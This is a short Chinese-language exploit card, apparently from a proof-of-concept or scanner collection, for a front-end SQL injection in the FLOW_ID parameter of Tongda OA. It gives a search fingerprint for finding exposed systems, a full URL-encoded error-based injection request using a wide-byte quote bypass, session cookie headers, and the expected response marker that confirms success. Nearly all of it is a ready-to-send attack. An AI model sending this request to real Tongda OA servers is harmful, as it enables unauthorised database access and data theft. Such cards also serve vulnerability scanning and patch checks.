# 通达OAFLOW_ID前台SQL注入漏洞

- **系统**：通达OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title="office Anywhere"`
- **请求**：`GET /general/score/flow/scoredate/result.php?FLOW_ID=11%bf%27%20and%20%28SELECT%201%20from%20%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28substring%28%28select%20md5%281122%29%20from%20user%20limit%201%29,1,62%29%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29%23 H`
- **关键头**：`Cookie: PHPSESSID=5c69ce55fd8e8aba091b846170af39d0; USER_NAME_COOKIE=admin; OA_USER_ID=a…`
- **预期**：200　|　3b712de481375